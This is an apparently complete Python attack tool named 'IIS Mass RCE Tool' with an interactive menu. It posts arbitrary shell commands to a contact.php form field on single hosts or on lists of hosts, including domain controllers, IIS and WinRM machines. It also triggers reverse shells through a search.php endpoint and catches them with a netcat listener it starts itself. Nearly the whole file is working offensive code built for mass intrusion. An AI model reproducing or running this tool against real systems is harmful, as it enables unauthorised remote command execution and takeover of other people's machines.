import requests
import time
import json
import subprocess
import threading
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from InquirerPy import inquirer
from InquirerPy.base.control import Choice

ALL_HOSTS = [
    "192.168.1.1",
    "192.168.1.2",
    "192.168.1.6",
    # Add your hosts here
]

ALL_DC = [
    "192.168.1.1",
    # Add your domain controllers here
]

ALL_IIS = [
    "192.168.1.2",
    # Add your IIS hosts here
]

ALL_WINRM = [
    "192.168.1.6",
    # Add your WinRM hosts here
]

ALL_ICMP = [
    # Add your ICMP hosts here
]

ALL_SMB = [
    # Add your SMB hosts here
]

PORT = 8080
TIMEOUT = 60
CONCURRENCY = 8
THROTTLE_MS = 50

def get_local_ip():
    """Get the local IP address of the current machine"""
    try:
        # Connect to a remote address to determine our own IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # Doesn't actually send data, just figures out the best route
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            return local_ip
    except:
        try:
            # Fallback: get hostname and resolve
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return local_ip
        except:
            return "127.0.0.1"

def send_command(client, port, command):
    url = f"http://{client}:{port}/contact.php"
    
    # Send as form data
    data = {"input_word": command}
    
    try:
        # Using form data approach
        r = requests.post(url, data=data, timeout=TIMEOUT)
        
        return (client, r.status_code, r.text[:500])  # Increased response preview
    except Exception as e:
        return (client, "ERR", str(e))
        
def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
    url = f"http://{client}:{port}/search.php"
    command = f"search {attacker_ip} {attacker_port}"
    data = {"input_word": command}
    
    try:
        r = requests.post(url, data=data, timeout=10)
        return (client, r.status_code, "Reverse Shell Triggered")
    except Exception as e:
        return (client, "ERR", str(e))
        
def start_listener(port):
    def listener():
        try:
            subprocess.run(f"nc -lvnp {port}", shell=True)
        except Exception as e:
            print(f"Listener error: {e}")
    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread
    
def main_interface():
    action = inquirer.select(
        message="Select an action:",
        choices=[
            Choice(value="SINGULAR", name="Singular Remote Code Execution"),
            Choice(value="MASS", name="Mass Remote Code Execution"),
            Choice(value="SHELL", name="Spawn a Reverse Shell"),
            Choice(value=None, name="Exit"),
        ],
        default="SINGULAR",
    ).execute()
    return action
    
def choose_targets():
    choice = inquirer.select(
        message="Which group would you like to target?",
        choices=[
            Choice(value="ALL_HOSTS", name="All Hosts"),
            Choice(value="ALL_DC", name="All Domain Controllers"),
            Choice(value="ALL_IIS", name="All IIS Hosts"),
            Choice(value="ALL_WINRM", name="All WinRM Hosts"),
            Choice(value="ALL_ICMP", name="All ICMP Hosts"),
            Choice(value="ALL_SMB", name="All SMB Hosts"),
            Choice(value="CUSTOM", name="Custom (Enter Comma-Separated List)"),
            Choice(value=None, name="Cancel"),
        ],
    ).execute()
    
    if not choice:
        return []

    if choice == "CUSTOM":
        text = inquirer.text(message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):").execute()
        targets = [t.strip() for t in text.split(",") if t.strip()]
        return targets

    mapping = {
        "ALL_HOSTS": ALL_HOSTS,
        "ALL_DC": ALL_DC,
        "ALL_IIS": ALL_IIS,
        "ALL_WINRM": ALL_WINRM,
        "ALL_ICMP": ALL_ICMP,
        "ALL_SMB": ALL_SMB,
    }
    return mapping.get(choice, [])
    
def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None):
    print(f"\nExecuting on {len(clients)} targets...")
    print("=" * 50)
    
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futures = []
        for client in clients:
            if action_type == "command":
                # Send command to each client with throttling
                futures.append(ex.submit(send_command, client, port, command))
            elif action_type == "shell":
                # Use the provided attacker IP and port
                futures.append(ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port))
                
            time.sleep(THROTTLE_MS / 1000.0)
            
        completed = 0
        for fut in as_completed(futures):
            target, status, response = fut.result()
            print(f"[{completed+1}/{len(clients)}] {target} -> {status}")
            if status == 200 and action_type == "command":
                print(f"Response: {response}")
            print("-" * 30)
            completed += 1

def singular_execution():
    target = inquirer.text(message="Enter target IP:").execute()
    command = inquirer.text(message="Enter command to execute:").execute()
    
    if not target or not command:
        print("Invalid input")
        return
    
    print(f"\nSending command to {target}...")
    result = send_command(target, PORT, command)
    target, status, response = result
    print(f"Target: {target}")
    print(f"Status: {status}")
    print(f"Response:\n{response}")

def mass_execution():
    targets = choose_targets()
    if not targets:
        print("No targets selected")
        return
    
    command = inquirer.text(message="Enter command to execute on all targets:").execute()
    if not command:
        print("No command entered")
        return
    
    print(f"\nTargeting {len(targets)} hosts with command: {command}")
    confirm = inquirer.confirm(message="Proceed?", default=True).execute()
    if not confirm:
        return
    
    run_threads(targets, PORT, command, "command")

def shell_execution():
    # For shell spawning, only allow single target selection
    print("\n=== Reverse Shell Setup ===")
    print("Note: Shell spawning only works with single targets")
    
    # Get single target
    target = inquirer.text(message="Enter target IP:").execute()
    if not target:
        print("No target specified")
        return
    
    # Get local IP automatically
    local_ip = get_local_ip()
    print(f"Detected local IP: {local_ip}")
    
    # Get listener port
    listener_port = inquirer.text(message="Listener port:", default="6767").execute()
    
    # Confirm with the detected IP
    confirm = inquirer.confirm(
        message=f"Trigger reverse shell from {target} to {local_ip}:{listener_port}?", 
        default=True
    ).execute()
    
    if not confirm:
        # Allow manual IP override if needed
        use_custom = inquirer.confirm(
            message="Use different attacker IP?", 
            default=False
        ).execute()
        if use_custom:
            local_ip = inquirer.text(message="Enter attacker IP:").execute()
        else:
            return
    
    # Start listener
    print(f"Starting listener on port {listener_port}...")
    listener_thread = start_listener(listener_port)
    time.sleep(1)  # Give listener time to start
    
    # Trigger the reverse shell (single target)
    print(f"\nTriggering reverse shell on {target}...")
    result = spawn_reverse_shell(target, PORT, local_ip, listener_port)
    target_ip, status, response = result
    
    print(f"Target: {target_ip}")
    print(f"Status: {status}")
    print(f"Response: {response}")
    
    if status == 200:
        print(f"\nReverse shell triggered successfully!")
        print(f"Listener running on {local_ip}:{listener_port}")
        print("Waiting for connection...")
        print("Press Ctrl+C to stop listening...")
        
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            print("\nStopped by user")
    else:
        print(f"\nFailed to trigger reverse shell: {response}")
        # Stop the listener if shell failed
        listener_thread.join(timeout=1)

def main():
    print("=== IIS Mass RCE Tool ===")
    print("Advanced Remote Code Execution and Reverse Shell Deployment")
    
    # Show local IP at startup
    local_ip = get_local_ip()
    print(f"Local IP: {local_ip}")
    print()
    
    while True:
        action = main_interface()
        if action is None:
            print("Goodbye.")
            break
            
        if action == "SINGULAR":
            singular_execution()
        elif action == "MASS":
            mass_execution()
        elif action == "SHELL":
            shell_execution()
        else:
            print("Unknown action, returning to menu.")
        
        print()  # Empty line for readability

if __name__ == "__main__":
    main()
